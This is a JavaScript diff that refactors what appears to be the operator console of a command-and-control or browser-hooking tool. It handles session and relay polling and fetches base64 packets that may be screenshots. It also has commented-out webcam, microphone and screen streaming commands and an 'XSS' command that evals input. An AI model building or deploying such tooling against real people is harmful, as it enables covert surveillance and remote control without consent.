@@ -10,17 +10,39 @@
 
 	// Escape HTML
 	app.functions.escapeHTML = async data => {
-		return new String(data)
-			.replace(/\&/g, "&amp;")
-			.replace(/\</g,"&lt;")
-			.replace(/\>/g,"&gt;")
-			.replace(/\"/g, "&quot;")
-			.replace(/\'/g,"&#39;")
-			.replace(/\\/g, "&#92;")
-			.replace(/\//g, "&#x2F;")
-			.replace(/ /g, "&nbsp;")
-			.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;")
-			.replace(/\n/g, "<br>")
+		return new Promise(async(resolve)=>{
+			resolve(
+				new String(data)
+					.replace(/\&/g, "&amp;")
+					.replace(/\</g,"&lt;")
+					.replace(/\>/g,"&gt;")
+					.replace(/\"/g, "&quot;")
+					.replace(/\'/g,"&#39;")
+					.replace(/\\/g, "&#92;")
+					.replace(/\//g, "&#x2F;")
+					.replace(/ /g, "&nbsp;")
+					.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;")
+					.replace(/\n/g, "<br>")
+			)
+		})
+	}
+
+	// Escape HTML
+	app.functions.escapeRegExp = async data => {
+		return new Promise(async(resolve)=>{
+			resolve(
+				new String(data)
+					.replace(/\\/g, "\\\\")
+					.replace(/\[/g, "\\[")
+					.replace(/\]/g, "\\]")
+					.replace(/\?/g, "[?]")
+					.replace(/\!/g, "[!]")
+					.replace(/\*/g, "[*]")
+					.replace(/\(/g, "[(]")
+					.replace(/\)/g, "[)]")
+					.replace(/\-/g, "[-]")
+			)
+		})
 	}
 
 	// Strip strings
@@ -146,7 +168,7 @@
 	app.functions.stdIn = async url_encoded => {
 		const form = new String(
 			"body=" + url_encoded + 
-			"&session_id=" + app.environment.session_id + 
+			"&session_id=" + app.environment.sessionID + 
 			"&relay_id=" + app.environment.relay
 		)
 
@@ -160,7 +182,7 @@
 	app.functions.changeFetchRate = async (min, max) => {
 		const form = new String(
 			"body=" + app.environment.sessionConfig.fetch_rate_tag + " " + min + " " + max + 
-			"&session_id=" + app.environment.session_id + 
+			"&session_id=" + app.environment.sessionID + 
 			"&relay_id=" + app.environment.relay
 		)
 
@@ -180,7 +202,7 @@
 	app.functions.fetchPackets = async () => {
 		const form = new String(
 			"packet_id=" + 
-			"&session_id=" + app.environment.session_id + 
+			"&session_id=" + app.environment.sessionID + 
 			"&relay_id=" + app.environment.relay
 		)
 
@@ -199,7 +221,7 @@
 
 					const form = new String(
 						"packet_id=" + packetID + 
-						"&session_id=" + app.environment.session_id + 
+						"&session_id=" + app.environment.sessionID + 
 						"&relay_id=" + app.environment.relay
 					)
 
@@ -214,7 +236,7 @@
 
 						const plaintext = atob(response)
 
-						await app.functions.print(app.environment.response_tag + " <span class=\"bold lightgreen\">OK</span> <span>" + await app.functions.timestamp() + "</span><br>")
+						await app.functions.print(app.environment.responseTag + " <span class=\"bold lightgreen\">OK</span> <span>" + await app.functions.timestamp() + "</span><br>")
 
 						if ( plaintext.startsWith("\xff\xd8\xff") || plaintext.startsWith("\xFF\xD8\xFF") ) {
 							const type = "image/jpg"
@@ -245,29 +267,29 @@
 
 	// Start auto fetcher
 	app.functions.startAutoFetching = async (min, max) => {
-		if (app.environment.auto_fetching) {
+		if (app.environment.autoFetching) {
 			await app.functions.stopAutoFetching()
 
 			app.functions.startAutoFetching(min, max)
 		} else {
-			app.environment.auto_fetching = true
+			app.environment.autoFetching = true
 
-			app.environment.fetch_delay = app.functions.randTime(min, max) * 1000
+			app.environment.fetchDelay = app.functions.randTime(min, max) * 1000
 
 			app.functions.fetchPackets()
 
 			app.environment.autoFetch = async () => {
-				if (app.environment.auto_fetching) {
-					app.environment.fetch_delay = await app.functions.randTime(min, max) * 1000
+				if (app.environment.autoFetching) {
+					app.environment.fetchDelay = await app.functions.randTime(min, max) * 1000
 
 					app.functions.startLoadLine()
 					app.functions.fetchPackets()
 
-					app.environment.autoFetchSession = setTimeout(app.environment.autoFetch, app.environment.fetch_delay)
+					app.environment.autoFetchSession = setTimeout(app.environment.autoFetch, app.environment.fetchDelay)
 				}
 			}
 
-			if (app.environment.fetch_on_auto_fetch_start) {
+			if (app.environment.fetchOnAutoFetchStart) {
 				app.environment.autoFetchSession = setTimeout(app.environment.autoFetch, 0)
 			}
 
@@ -277,12 +299,12 @@
 
 	// Stop auto fetcher
 	app.functions.stopAutoFetching = async (min, max) => {
-		if (app.environment.auto_fetching) {
-			app.environment.auto_fetching = false
+		if (app.environment.autoFetching) {
+			app.environment.autoFetching = false
 
 			clearTimeout(app.environment.autoFetchSession)
 
-			app.environment.load_line.classList.add("stop")
+			app.environment.loadLine.classList.add("stop")
 
 			app.functions.print("<span>Auto fetcher stopped.<br></span>")
 		} else {
@@ -295,9 +317,7 @@
 		const res = await app.http.Request("GET", "/session/" + relay + "/" + session, [[]], "")
 
 		if (res.status == 200) {
-			const json = JSON.parse(res.responseText)
-
-			app.environment.sessionConfig = json
+			app.environment.sessionConfig = JSON.parse(res.responseText)
 		}
 	}
 
@@ -306,26 +326,24 @@
 		const res = await app.http.Request("GET", "/config/" + relay, [[]], "")
 
 		if (res.status == 200) {
-			const json = JSON.parse(res.responseText)
-
-			app.environment.relayConfig = json
+			app.environment.relayConfig = JSON.parse(res.responseText)
 		}
 	}
 
 	// Move loadline
 	app.functions.startLoadLine = async () => {
-		app.environment.load_line.classList.add("stop")
+		app.environment.loadLine.classList.add("stop")
 
 		setTimeout(async()=>{
-			const delay = (app.environment.fetch_delay - 600)
+			const delay = (app.environment.fetchDelay - 600)
 
-			app.environment.load_line.style.transition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
-			app.environment.load_line.style.webkitTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
-			app.environment.load_line.style.mozTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
-			app.environment.load_line.style.msTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
-			app.environment.load_line.style.oTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
+			app.environment.loadLine.style.transition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
+			app.environment.loadLine.style.webkitTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
+			app.environment.loadLine.style.mozTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
+			app.environment.loadLine.style.msTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
+			app.environment.loadLine.style.oTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
 
-			app.environment.load_line.classList.remove("stop")
+			app.environment.loadLine.classList.remove("stop")
 		}, 100)
 	}
 
@@ -377,7 +395,7 @@
 
 	// Start new monitor stream
 	app.functions.streamMon = async (bitrate, resolution) => {
-		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + app.environment.session_id)
+		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + app.environment.sessionID)
 
 		// if (res.status == 200) {
 		// 	let response = res.responseText.split(" ")
@@ -385,7 +403,7 @@
 		// 	let streamID = response[0]
 		// 	let streamFile = response[1]
 
-		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
+		// 	app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
 
 		// 	if (response[0] == "Usage:") {
 		// 		app.functions.print("<span>" + response + "</span>")
@@ -401,7 +419,7 @@
 
 	// Start new microphone stream
 	app.functions.streamMic = async bitrate => {
-		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + app.environment.session_id)
+		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + app.environment.sessionID)
 
 		// if (res.status == 200) {
 		// 	let response = res.responseText.split(" ")
@@ -409,7 +427,7 @@
 		// 	let streamID = response[0]
 		// 	let streamFile = response[1]
 
-		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
+		// 	app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
 
 		// 	if (response[0] == "Usage:") {
 		// 		app.functions.print("<span>" + response + "</span>")
@@ -425,9 +443,9 @@
 
 	// Start new webcam stream
 	app.functions.streamCam = async (bitrate, resolution) => {
-		// app.functions.print(app.environment.request_tag + "<span title='" + await app.functions.timestamp() + "'>Streaming webcam...</span>")
+		// app.functions.print(app.environment.requestTag + "<span title='" + await app.functions.timestamp() + "'>Streaming webcam...</span>")
 
-		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMCAM&session_id=" + app.environment.session_id)
+		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMCAM&session_id=" + app.environment.sessionID)
 
 		// if (res.status == 200) {
 		// 	let response = res.responseText.split(" ")
@@ -435,7 +453,7 @@
 		// 	let streamID = response[0]
 		// 	let streamFile = response[1]
 
-		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
+		// 	app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")
 
 		// 	if (response[0] == "Usage:") {
 		// 		app.functions.print("<span>" + response + "</span>")
@@ -464,24 +482,20 @@
 	}
 
 	// Autocomplete stdin
-	app.functions.autoComplete = (tabbed_command, pre_cursor) => {
+	app.functions.autoComplete = async (tabbed_command, pre_cursor) => {
 		const commands = Object.keys(app.commands.builtin).concat( Object.keys(app.commands.pluggedin) )
 
-		tabbed_command = tabbed_command
-			.replace(/\[/g, "\\[")
-			.replace(/\]/g, "\\]")
-			.replace(/\?/g, "[?]")
-			.replace(/\!/g, "[!]")
-			.replace(/\*/g, "[*]")
-			.replace(/\(/g, "[(]")
-			.replace(/\)/g, "[)]")
-			.replace(/\-/g, "[-]")
+		tabbed_command = await app.functions.escapeRegExp(tabbed_command)
 
 		let regexp = new RegExp("(?:^|\\s)" + tabbed_command, "ig")
 
 		if ( commands.join(" ").match(regexp) ) {
 			if ( commands.join(" ").match(regexp).length > 1 ) {
-				app.functions.print( commands.join(" ").match( new RegExp("(?:^|\\s)" + tabbed_command + "\\S*", "ig") ).join("&nbsp;&nbsp;") + "<br>" )
+				const log_str = new String(
+					app.environment.requestTag + await app.functions.escapeHTML(pre_cursor) + "<br>" + 
+					commands.join(" ").match( new RegExp("(?:^|\\s)" + tabbed_command + "\\S*", "ig") ).join("&nbsp;&nbsp;") + "<br>" 
+				)
+				app.functions.print(log_str)
 			} else if ( commands.join(" ").match(regexp).length == 1 ) {
 				for (let i = 0; i < commands.length; i++) {
 					if ( commands[i].match(regexp) ) {
@@ -512,15 +526,15 @@
 
 	// StdIn handler
 	app.functions.parseCommand = async cmd => {
-		app.environment.cmd_history_i = 0
+		app.environment.cmdHistoryIndex = 0
 
 		cmd = cmd.replace(/^\s*/, "")
 
-		app.functions.print( app.environment.request_tag + "<span title='" + await app.functions.timestamp() + "'>" + await app.functions.escapeHTML(cmd) + "</span><br>" )
+		app.functions.print( app.environment.requestTag + "<span title='" + await app.functions.timestamp() + "'>" + await app.functions.escapeHTML(cmd) + "</span><br>" )
 
 		if ( !cmd.match(/^\s*$/) ) {
-			if (app.environment.cmd_history[0] != cmd) {
-				app.environment.cmd_history.unshift(cmd)
+			if (app.environment.cmdHistory[0] != cmd) {
+				app.environment.cmdHistory.unshift(cmd)
 			}
 
 			// Parse command
@@ -531,15 +545,7 @@
 				const commands = Object.keys(app.commands.builtin).concat( Object.keys(app.commands.pluggedin) )
 
 				for (let i = 0; i < commands.length; i++) {
-					regexp = new RegExp("^" + command
-						.replace(/\[/g, "\\[")
-						.replace(/\]/g, "\\]")
-						.replace(/\?/g, "[?]")
-						.replace(/\!/g, "[!]")
-						.replace(/\*/g, "[*]")
-						.replace(/\(/g, "[(]")
-						.replace(/\)/g, "[)]")
-						.replace(/\-/g, "[-]") + "$", "i")
+					regexp = new RegExp("^" + await app.functions.escapeRegExp(command) + "$", "i")
 
 					if ( commands[i].match(regexp) ) {
 						if (app.commands.builtin[ commands[i] ]) {
@@ -577,7 +583,7 @@
 
 	app.functions.parseXSSCommand = async cmd => {
 		app.functions.print( 
-			app.environment.request_tag + " <span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
+			app.environment.requestTag + " <span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
 			"<span class=\"red\">" + await app.functions.escapeHTML(cmd) + "</span><br>" + 
 			"<span>" + eval(cmd) + "</span><br>" 
 		)
